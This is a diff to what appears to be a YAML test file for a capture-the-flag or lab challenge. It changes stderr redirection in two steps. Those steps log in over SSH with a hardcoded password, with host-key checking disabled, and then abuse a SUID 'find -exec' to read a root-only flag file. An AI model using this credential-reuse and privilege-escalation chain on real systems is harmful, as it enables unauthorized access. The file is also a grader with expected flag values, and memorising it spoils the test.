@@ -113,12 +113,12 @@ test:
       timeout: 15
 
     - name: "SSH to backend with discovered credentials and read token 2"
-      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'cat /home/deploy/marker.txt' 2>/dev/null"
+      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'cat /home/deploy/marker.txt' 2>&1"
       expect: "p1v0t"
       timeout: 15
 
     - name: "Exploit SUID find to read token 3 from /root/flag.txt"
-      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      command: "sshpass -p 'Ap3x_D3pl0y_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.backend} 'find . -exec cat /root/flag.txt \\; -quit' 2>&1"
       expect: "r00t3d"
       timeout: 15
 
